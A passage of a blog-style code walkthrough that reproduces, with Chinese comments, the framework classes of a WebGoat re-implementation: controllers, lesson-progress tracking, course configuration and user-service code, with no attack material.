class="built_in">this</span>.userTrackerRepository = userTrackerRepository;</span><br><span class="line">        <span class="built_in">this</span>.webSession = webSession;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(MethodParameter methodParameter, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; clazz)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">beforeBodyWrite</span><span class="params">(Object o, MethodParameter methodParameter, MediaType mediaType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> AttackResult attackResult)&#123;</span><br><span class="line">            trackProgress(attackResult);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">trackProgress</span><span class="params">(AttackResult attackResult)</span>&#123;</span><br><span class="line">        <span class="type">UserTracker</span> <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(webSession.getUserName());</span><br><span class="line">        <span class="keyword">if</span> (userTracker == <span class="literal">null</span>)&#123;</span><br><span class="line">            userTracker = <span class="keyword">new</span> <span class="title class_">UserTracker</span>(webSession.getUserName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (attackResult.assignmentSolved())&#123;</span><br><span class="line">            userTracker.assignmentSolved(webSession.getCurrentLesson(),attackResult.getAssignment());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            userTracker.assignmentFailed(webSession.getCurrentLesson());</span><br><span class="line">        &#125;</span><br><span class="line">        userTrackerRepository.saveAndFlush(userTracker);</span><br><span class="line">        <span class="keyword">return</span> attackResult;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">//Controller 该类代表控制器(控制层 表现层)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Welcome</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">WELCOMED</span> <span class="operator">=</span> <span class="string">&quot;welcomed&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(path = &#123;&quot;welcome.mvc&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">welcome</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"><span class="comment">//        获取httpsession对象</span></span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(WELCOMED) == <span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//            如果获取到的webcomed是空就进行赋值</span></span><br><span class="line">            session.setAttribute(WELCOMED,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        model.setViewName(<span class="string">&quot;forward:/attack?start=true&quot;</span>);</span><br><span class="line"><span class="comment">//        这里也是进行请求转发到/attack?start=true</span></span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="StartLesson"><a href="#StartLesson" class="headerlink" title="StartLesson"></a>StartLesson</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.Course;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StartLesson</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession ws;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Course course;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">StartLesson</span><span class="params">(WebSession ws,Course course)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.ws = ws;</span><br><span class="line">        <span class="built_in">this</span>.course = course;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path =  &quot;startlesson.mvc&quot;,method = &#123;RequestMethod.GET,RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">start</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        model.addObject(<span class="string">&quot;course&quot;</span>,course);</span><br><span class="line">        model.addObject(<span class="string">&quot;lesson&quot;</span>,ws.getCurrentLesson());</span><br><span class="line"><span class="comment">//        设置model中存放的数据</span></span><br><span class="line">        model.setViewName(<span class="string">&quot;lesson_content&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &#123;&quot;*.lesson&quot;&#125;,produces = &quot;text/html&quot;)</span></span><br><span class="line"><span class="comment">//  produces指定返回编码</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">lessonPage</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;lesson_content&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">path</span> <span class="operator">=</span> request.getRequestURI().toString();</span><br><span class="line"><span class="comment">//        获取得到的路径 现在我们得到了 /a/b/c/AccessControlMatrix.lesson</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">lessonName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&#x27;/&#x27;</span>)+<span class="number">1</span>,path.indexOf(<span class="string">&quot;.lesson&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        course.getLessons()</span><br><span class="line">                .stream()</span><br><span class="line">                .filter(l-&gt;l.getId().equals(lessonName))</span><br><span class="line">                .findFirst()</span><br><span class="line">                .ifPresent(lesson -&gt; &#123;</span><br><span class="line">                    ws.setCurrentLesson(lesson);</span><br><span class="line">                    model.addObject(<span class="string">&quot;lesson&quot;</span>,lesson);</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="lessons-4"><a href="#lessons-4" class="headerlink" title="lessons"></a>lessons</h2><h3 id="CourseConfiguration"><a href="#CourseConfiguration" class="headerlink" title="CourseConfiguration"></a>CourseConfiguration</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.Course;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.ArrayUtils;</span><br><span class="line"><span class="keyword">import</span> org.hsqldb.lib.ArrayUtil;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.CollectionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PutMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.ParameterizedType;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.stream.Collectors.groupingBy;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//将想要的组件添加到容器中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CourseConfiguration</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Lesson&gt; lessons;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;AssignmentEndpoint&gt; assignment;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,List&lt;AssignmentEndpoint&gt;&gt; assignmentsByPackage;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CourseConfiguration</span><span class="params">(List&lt;Lesson&gt; lessons, List&lt;AssignmentEndpoint&gt; assignment)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.lessons = lessons;</span><br><span class="line">        <span class="built_in">this</span>.assignment = assignment;</span><br><span class="line">        assignmentsByPackage = <span class="built_in">this</span>.assignment.stream().collect(groupingBy(a -&gt;a.getClass().getPackageName()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Course <span class="title function_">course</span><span class="params">()</span>&#123;</span><br><span class="line">        lessons.stream().forEach(l-&gt;l.setAssignments(createAssignment(l)));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Course</span>(lessons);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Assignment&gt; <span class="title function_">createAssignment</span><span class="params">(Lesson lesson)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">endpoints</span> <span class="operator">=</span> assignmentsByPackage.get(lesson.getClass().getPackageName());</span><br><span class="line">        <span class="keyword">if</span> (CollectionUtils.isEmpty(endpoints))&#123;</span><br><span class="line">            log.warn(<span class="string">&quot;Lesson:&#123;&#125; hax no endpoints, is this intentionally?&quot;</span>,lesson.getTitle());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> endpoints.stream()</span><br><span class="line">                .map(e-&gt;<span class="keyword">new</span> <span class="title class_">Assignment</span>(e.getClass().getSimpleName(),getPath(e.getClass()),getHints(e.getClass())))</span><br><span class="line">                .toList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getPath</span><span class="params">(Class&lt;? extends AssignmentEndpoint&gt; e)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Method m : e.getMethods())&#123;</span><br><span class="line">            <span class="keyword">if</span> (methodReturnTypeIsOfTypeAttackResult(m))&#123;</span><br><span class="line">                <span class="type">var</span> <span class="variable">mapping</span> <span class="operator">=</span> getMapping(m);</span><br><span class="line">                <span class="keyword">if</span> (mapping != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> mapping;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Assignment endpoint: &quot;</span> + e + <span class="string">&quot; has no mapping like @GetMapping/@PostMapping etc,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;with return type &#x27;AttackResult&#x27; or &#x27;ResponseEntity&lt;AttackResult&gt;&#x27; please consider adding one&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">methodReturnTypeIsOfTypeAttackResult</span><span class="params">(Method m )</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (m.getReturnType() == AttackResult.class)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">var</span> <span class="variable">genericType</span> <span class="operator">=</span> m.getGenericReturnType();</span><br><span class="line">        <span class="keyword">if</span> (genericType <span class="keyword">instanceof</span> ParameterizedType)&#123;</span><br><span class="line">            <span class="keyword">return</span> ((ParameterizedType) m.getGenericReturnType()).getActualTypeArguments()[<span class="number">0</span>] == AttackResult.class;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getMapping</span><span class="params">(Method m)</span>&#123;</span><br><span class="line">        String[] paths = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (m.getAnnotation(RequestMapping.class)!= <span class="literal">null</span>)&#123;</span><br><span class="line">            paths = ArrayUtils.addAll(m.getAnnotation(RequestMapping.class).value(),m.getAnnotation(RequestMapping.class).path());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (m.getAnnotation(PostMapping.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">            paths = ArrayUtils.addAll(m.getAnnotation(PostMapping.class).value(), m.getAnnotation(PostMapping.class).path());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (m.getAnnotation(GetMapping.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">            paths = ArrayUtils.addAll(m.getAnnotation(GetMapping.class).value(), m.getAnnotation(GetMapping.class).path());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (m.getAnnotation(PutMapping.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">            paths = ArrayUtils.addAll(m.getAnnotation(PutMapping.class).value(), m.getAnnotation(PutMapping.class).path());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (paths == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Arrays.stream(paths).filter(path -&gt; !<span class="string">&quot;&quot;</span>.equals(path) ).findFirst().orElse(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;String &gt; getHints(Class&lt;? <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &gt; e)&#123;</span><br><span class="line">        <span class="keyword">if</span> (e.isAnnotationPresent(AssignmentHints.class))&#123;</span><br><span class="line">            <span class="keyword">return</span> List.of(e.getAnnotationsByType(AssignmentHints.class)[<span class="number">0</span>].value());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Collections.emptyList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Value;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Value</span></span><br><span class="line"><span class="comment">//@Value同样会生成getter、toString、hashCode等方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String hint;</span><br><span class="line">    <span class="keyword">private</span> String assignmentPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LessonInfoModel"><a href="#LessonInfoModel" class="headerlink" title="LessonInfoModel"></a>LessonInfoModel</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonInfoModel</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String lessonTitle;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> hasSource;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> hasSolution;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> hasPlan;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LessonMenuItem"><a href="#LessonMenuItem" class="headerlink" title="LessonMenuItem"></a>LessonMenuItem</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonMenuItem</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> LessonMenuItemType type;</span><br><span class="line">    <span class="keyword">private</span> List&lt;LessonMenuItem&gt; children = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> complete;</span><br><span class="line">    <span class="keyword">private</span> String link;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> ranking;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  List&lt;LessonMenuItem&gt; <span class="title function_">getChildren</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> children;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setChildren</span><span class="params">(List&lt;LessonMenuItem&gt; children)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.children = children;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> LessonMenuItemType <span class="title function_">getType</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> type;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(LessonMenuItemType type)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addChild</span><span class="params">(LessonMenuItem child)</span>&#123;</span><br><span class="line">        children.add(child);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        builder.append(<span class="string">&quot;Name: &quot;</span>).append(name).append(<span class="string">&quot; | &quot;</span>);</span><br><span class="line">        builder.append(<span class="string">&quot;Type: &quot;</span>).append(name).append(<span class="string">&quot; | &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> builder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isComplete</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> complete;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setComplete</span><span class="params">(<span class="type">boolean</span> complete)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.complete = complete;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLink</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> link;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLink</span><span class="params">(String link)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.link = link;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">setRanking</span><span class="params">(<span class="type">int</span> ranking)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.ranking = ranking;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getRanking</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.ranking;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LessonMenuItemType"><a href="#LessonMenuItemType" class="headerlink" title="LessonMenuItemType"></a>LessonMenuItemType</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">LessonMenuItemType</span> &#123;</span><br><span class="line"><span class="comment">//    定义一个枚举类型</span></span><br><span class="line">    CATEGORY,</span><br><span class="line">    LESSON,</span><br><span class="line">    STAGE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WebWolfRedirect"><a href="#WebWolfRedirect" class="headerlink" title="WebWolfRedirect"></a>WebWolfRedirect</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebWolfRedirect</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ApplicationContext applicationContext;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/WebWolf&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">openWebWolf</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">url</span> <span class="operator">=</span> applicationContext.getEnvironment().getProperty(<span class="string">&quot;webwolf.url&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;redirect:&quot;</span>+url+<span class="string">&quot;/home&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="webwolf-1"><a href="#webwolf-1" class="headerlink" title="webwolf"></a>webwolf</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><h3 id="UserService-1"><a href="#UserService-1" class="headerlink" title="UserService"></a>UserService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.user;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UsernameNotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="comment">//@Service注解用于类上，标记当前类是一个service类，加上该注解会将当前类自动注入到spring容器中，不需要再在applicationContext.xml文件定义bean了</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">(UserRepository userRepository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userRepository = userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> WebGoatUser <span class="title function_">loadUserByUsername</span><span class="params">(<span class="keyword">final</span> String username)</span> <span class="keyword">throws</span> UsernameNotFoundException&#123;</span><br><span class="line">        <span class="type">WebGoatUser</span> <span class="variable">webGoatUser</span> <span class="operator">=</span> userRepository.findByUsername(username);</span><br><span class="line"><span class="comment">//        调接口去查找用户名</span></span><br><span class="line">        <span class="keyword">if</span> (webGoatUser == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;User not found&quot;</span>);</span><br><span class="line"><span class="comment">//            抛出新异常User 没找到</span></span><br><span class="line">        &#125;</span><br><span class="line">        webGoatUser.createUser();</span><br><span class="line">        <span class="keyword">return</span> webGoatUser;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">(<span class="keyword">final</span> String username, <span class="keyword">final</span> String password)</span> &#123;</span><br><span class="line">        userRepository.save(<span class="keyword">new</span> <span class="title class_">WebGoatUser</span>(username, password));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UserRepository-1"><a href="#UserRepository-1" class="headerlink" title="UserRepository"></a>UserRepository</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.WebGoatUser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;WebGoatUser,String&gt; &#123;</span><br><span class="line"><span class="comment">//   JpaRepository 主要是用来查询的</span></span><br><span class="line">    WebGoatUser <span class="title function_">findByUsername</span><span class="params">(String username)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

